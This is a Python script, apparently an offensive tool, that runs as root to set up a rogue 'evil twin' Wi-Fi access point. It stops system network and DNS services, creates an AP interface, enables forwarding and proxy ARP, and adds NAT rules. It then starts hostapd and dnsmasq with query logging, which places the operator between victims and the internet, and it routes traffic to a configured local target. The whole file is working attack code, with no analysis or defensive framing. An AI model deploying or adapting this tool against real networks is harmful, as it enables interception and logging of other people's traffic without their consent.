#!/usr/bin/env python3
import subprocess, json, sys, os, time, signal, re

class LocalNetAttack:
    def __init__(self, config_file="/tmp/evil.json"):
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        except:
            print("  !!! Error loading config")
            sys.exit(1)

        self.ap = self.config["ap_ip"]
        self.subnet = self.config["subnet"]
        self.eth = self.config["eth"]
        self.wifi = self.config["wifi"]
        self.attack = self.config["attack"]
        self.ap_interface = "ap0"  
        self.processes = []


    def run(self, cmd, check=False):
        try:
            return subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
        except:
            return None


    def prep(self):
        self.run("iptables-save > /tmp/iptables-before.rules")
        self.run("systemctl stop NetworkManager", check=False)
        self.run("rfkill unblock all")
        self.run(f"iw dev {self.ap_interface} del", check=False)


    def get_phy(self):
        out = self.run("iw dev", check=False)
        if not out or not out.stdout:
            print("  !!! Could not run 'iw dev'")
            sys.exit(1)

        lines = out.stdout.splitlines()

        phy = None
        current_phy = None

        for line in lines:
            m_phy = re.search(r"(phy#\d+)", line)
            if m_phy:
                current_phy = m_phy.group(1)

            m_if = re.search(r"Interface[:\s]+(\S+)", line)
            if m_if:
                iface = m_if.group(1)
                if iface == self.wifi:
                    phy = current_phy
                    break

        if not phy:
            print(f"  !!! Could not detect WiFi PHY for {self.wifi}")
            print("  !!! Dump of 'iw dev':")
            print(out.stdout)
            sys.exit(1)

        return phy.replace("#", "")



    def create_ap(self):
        phy = self.get_phy()
        ap = self.ap_interface

        self.run(f"iw phy {phy} interface add {ap} type __ap")
        self.run(f"ip link set {ap} up")
        self.run(f"ip addr flush dev {ap}")

        sn = self.subnet.split("/")[1]
        self.run(f"ip addr add {self.ap}/{sn} dev {ap}")


    def enable_forwarding(self):
        ap = self.ap_interface
        self.run("sysctl -w net.ipv4.ip_forward=1")
        self.run(f"sysctl -w net.ipv4.conf.{ap}.proxy_arp=1")

    def localnet_attack(self):
        target_ip = self.config.get("local_target_ip")
        if not target_ip:
            return

        # find gateway for ethernet uplink
        r = self.run(f"ip route | grep 'default via' | grep '{self.eth}'")
        if not r or not r.stdout:
            return

        gw = r.stdout.split()[2]
        self.run(f"ip route add {target_ip} via {gw} dev {self.eth}", check=False)


    def iptables(self):
        ap = self.ap_interface
        eth = self.eth
        subnet = self.subnet

        # DHCP + DNS
        self.run(f"iptables -I INPUT -i {ap} -p udp --dport 67:68 -j ACCEPT")
        self.run(f"iptables -I INPUT -i {ap} -p udp --dport 53 -j ACCEPT")
        self.run(f"iptables -I INPUT -i {ap} -p tcp --dport 53 -j ACCEPT")

        # NAT
        self.run(f"iptables -t nat -A POSTROUTING -o {eth} -j MASQUERADE")
        self.run(f"iptables -t nat -A POSTROUTING -s {subnet} -o {eth} -j MASQUERADE")

        # Forwarding rules
        self.run(f"iptables -A FORWARD -i {ap} -o {eth} -j ACCEPT")
        self.run(f"iptables -A FORWARD -i {eth} -o {ap} -m state --state RELATED,ESTABLISHED -j ACCEPT")


    def start_hostapd(self):
        try:
            proc = subprocess.Popen(
                ["hostapd", "/tmp/hostapd-evil.conf"],
                stdout=open("/var/log/hostapd-evil.log", "w"),
                stderr=subprocess.STDOUT
            )
            self.processes.append(("hostapd", proc))
            time.sleep(2)
            return proc.poll() is None
        except:
            return False


    def start_dnsmasq(self):
        # kill all possible conflicts
        for svc in ["systemd-resolved", "dnsmasq", "bind9", "named"]:
            self.run(f"systemctl stop {svc}", check=False)
        self.run("pkill -9 dnsmasq", check=False)

        with open("/etc/resolv.conf", "w") as f:
            f.write("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")

        proc = subprocess.Popen(
            ["dnsmasq", "--no-daemon", "--log-queries",
             "--conf-file=/tmp/dnsmasq-evil.conf"],
            stdout=open("/var/log/dnsmasq-evil.log", "w"),
            stderr=subprocess.STDOUT
        )
        self.processes.append(("dnsmasq", proc))
        time.sleep(2)
        return proc.poll() is None


    def start(self):
        self.prep()
        self.create_ap()
        self.enable_forwarding()
        self.localnet_attack()
        self.iptables()

        if not self.start_hostapd():
            print("  !!! hostapd failed")
            return

        if not self.start_dnsmasq():
            print("  !!! dnsmasq failed")
            return

        print("  Evil AP started (LocalNet Attack Active)")

        signal.signal(signal.SIGINT, self.stop)
        while True:
            time.sleep(1)

    def stop(self, *args):
        print("\n  !!! Stopping...")
        sys.exit(0)


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root")
        sys.exit(1)

    LocalNetAttack().start()
